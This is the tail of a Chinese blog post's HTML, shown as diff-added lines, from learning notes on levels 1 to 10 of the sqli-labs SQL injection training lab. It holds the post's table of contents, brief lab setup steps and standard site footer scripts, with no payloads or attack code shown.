+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-环境搭建"><span class="toc-number">1.</span> <span class="toc-text">0x01 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02开始闯关"><span class="toc-number">2.</span> <span class="toc-text">0x02开始闯关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson1-字符型注入"><span class="toc-number">2.1.</span> <span class="toc-text">Lesson1:字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson2-数字型注入"><span class="toc-number">2.2.</span> <span class="toc-text">Lesson2:数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson3-有括号的单引号报错"><span class="toc-number">2.3.</span> <span class="toc-text">Lesson3:有括号的单引号报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson4-双引号括号报错注入"><span class="toc-number">2.4.</span> <span class="toc-text">Lesson4:双引号括号报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson5-单引号二次注入"><span class="toc-number">2.5.</span> <span class="toc-text">Lesson5:单引号二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson6-双引号二次注入"><span class="toc-number">2.6.</span> <span class="toc-text">Lesson6:双引号二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson7-利用注入写入文件"><span class="toc-number">2.7.</span> <span class="toc-text">Lesson7:利用注入写入文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson8-布尔型盲注"><span class="toc-number">2.8.</span> <span class="toc-text">Lesson8:布尔型盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson9-时间型盲注"><span class="toc-number">2.9.</span> <span class="toc-text">Lesson9:时间型盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson10-双引号时间型盲注"><span class="toc-number">2.10.</span> <span class="toc-text">Lesson10:双引号时间型盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-number">3.</span> <span class="toc-text">0x03 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&text=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&title=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&is_video=false&description=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli-libs学习笔记(1-10关)&body=Check out this article: http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&title=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&title=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&title=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&title=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&name=sqli-libs学习笔记(1-10关)&description=&lt;h2 id=&#34;0x01-环境搭建&#34;&gt;&lt;a href=&#34;#0x01-环境搭建&#34; class=&#34;headerlink&#34; title=&#34;0x01 环境搭建&#34;&gt;&lt;/a&gt;0x01 环境搭建&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;下载 sqli-lab 源码，地址为：&lt;a href=&#34;https://github.com/Audi-1/sqli-labs&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;放置网站根目录下，修改db-creds.inc 文件，添加本机 mysql 账户密码&lt;/li&gt;
+&lt;li&gt;打开 sqli-lab 首页，点击运行 setup/reset databse&lt;/li&gt;
+&lt;li&gt;数据库连接成功，接下来就可以测试了。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 zerokeeper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zerokeeper';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
